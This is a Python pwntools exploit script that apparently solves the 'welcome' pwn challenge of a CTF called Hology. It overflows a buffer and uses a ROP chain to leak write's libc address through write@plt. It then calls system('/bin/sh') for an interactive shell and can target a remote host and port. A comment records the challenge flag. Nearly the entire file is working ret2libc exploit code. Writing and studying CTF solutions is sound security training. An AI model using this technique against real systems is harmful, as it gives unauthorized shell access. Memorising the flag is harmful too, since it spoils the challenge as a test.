#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/hology2-final/pwn/welcome/welcome")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    attach(r)
    off = 40
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    pop_rdi = 0x0000000000400723
    pop_rsi_r15 = 0x0000000000400721

    write_got = 0x000000601018
    write_plt = 0x00000000004004e0
    main = 0x0000000000400669

    p = "A" * off
    p += p64(pop_rdi)
    p += p64(1)
    p += p64(pop_rsi_r15)
    p += p64(write_got)
    p += p64(4)
    p += p64(write_plt)
    p += p64(main)

    r.sendlineafter(":",p)
    r.recvuntil("WELCOME TO HOLOGY FINAL")
    leak = u64(r.recv(8)) # __GI___libc_write

    log.info("leak : " + hex(leak))

    libc_base = leak - libc.symbols['write']
    binsh = libc_base + libc.search('/bin/sh').next()
    system = libc_base + libc.symbols['system']

    print hex(binsh)
    print hex(system)

    q = "a" * 32
    q += "A"*8
    q += p64(pop_rdi)
    q += p64(binsh)
    q += p64(system)
    r.sendlineafter(":",q)
    r.interactive()

    # hctf{s4mp4I_b3rjUmp4_7ahUn_d3pAn}
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("34.87.0.60", 14044)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
